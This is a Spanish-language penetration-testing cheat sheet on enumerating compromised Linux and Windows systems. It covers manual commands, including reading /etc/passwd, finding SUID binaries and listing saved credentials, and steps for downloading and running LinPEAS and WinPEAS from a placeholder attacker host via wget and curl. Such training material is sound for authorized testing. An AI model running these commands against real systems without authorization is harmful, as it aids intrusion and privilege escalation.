# ENUMERAR SISTEMA 🕵️‍♂️🔍

La enumeración es un paso crítico para obtener información sobre el sistema objetivo. Puede hacerse de manera **manual** o mediante **herramientas automáticas**.

---

## MANUAL 🛠️

### LINUX 🐧

- **`whoami`** => Averigua el usuario actual
- **`hostname`** => Averigua el nombre del host
- **`uname -a`** => Muestra la versión del kernel
- **`cat /proc/version`** => Ver la versión del kernel
- **`cat /etc/passwd`** => Ver los usuarios en el sistema
- **`ifconfig`** => Ver la IP y tarjetas de red (para posibles pivotajes)
- **`sudo -l`** => Muestra los comandos que se pueden ejecutar con sudo
- **`netstat`** => Ver los servicios que están corriendo
- **`ps -ef`** => Ver los procesos que están en ejecución
- **`env`** => Mostrar las variables de entorno
- **`id`** => Ver el ID de usuario
- **`cat /etc/crontab`** => Ver las tareas programadas
- **`find / perm -u=s -type f 2>/dev/null`** => Buscar comandos vulnerables para añadir permisos
- **`getcap -r / 2>/dev/null`** => Buscar capacidades en archivos ejecutables

---

### WINDOWS 🖥️

- **`hostname`** => Muestra el nombre del host
- **`whoami`** => Muestra el nombre del usuario
- **`whoami /priv`** => Ver los permisos disponibles en la máquina (similar a `sudo -l`)
- **`systeminfo`** => Ver los parches instalados en la máquina, la versión del kernel
- **`ipconfig`** => Ver la IP y tarjetas de red
- **`cmdkey /list`** => Ver las credenciales guardadas
- **`icacls <ruta>`** => Ver los permisos de una ruta especificada
- **`sc query windefend`** => Consultar el servicio de Windows Defender
- **`sc queryex type=service`** => Consultar los servicios en el sistema
- **`netsh advfirewall firewall dump`** => Ver la configuración del firewall o antivirus
- **`schtasks /query /fo LIST /v`** => Ver las tareas programadas
- **`reg /query`** => Consultar el registro de Windows
- **`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`** => Consultar las políticas de AppLocker

---

## AUTOMATICO 🤖

### Herramientas para Enumeración

#### **LinPeas** (Linux/Mac)
Automatiza la enumeración en sistemas Linux y Mac.

- **Pasos para usar LinPeas en Linux:**
  1. Crea un servidor en la máquina atacante en la carpeta de LinPeas: `/usr/share/peass/linpeas`
     ```bash
     python3 -m http.server 8080
     ```
  2. En el sistema objetivo, navega al directorio `/tmp` para descargar LinPeas:
     ```bash
     wget http://<IP_ATACANTE>:8080/linpeas.sh
     ```
  3. Asigna permisos de ejecución al archivo descargado:
     ```bash
     chmod +x linpeas.sh
     ```
  4. Ejecuta el script:
     ```bash
     ./linpeas.sh
     ```

#### **WinPeas** (Windows)
Automatiza la enumeración en sistemas Windows.

- **Pasos para usar WinPeas en Windows:**
  1. Crea un servidor en la máquina atacante:
     ```bash
     python3 -m http.server 8080
     ```
  2. Busca una carpeta en el sistema objetivo donde puedas escribir y descarga WinPeas:
     ```bash
     curl -O http://<IP_ATACANTE>:8080/winPEASany_ofs.exe
     ```
  3. Ejecuta el archivo `.exe` descargado:
     ```bash
     /winPEASany_ofs.exe
     ```

#### **MacPeas** (Obsoleto)
Ahora se usa LinPeas para la enumeración en Mac.

---

> **Nota** 📝: Asegúrate de tener permisos explícitos para realizar estas pruebas en los sistemas que estás evaluando. ⚠️
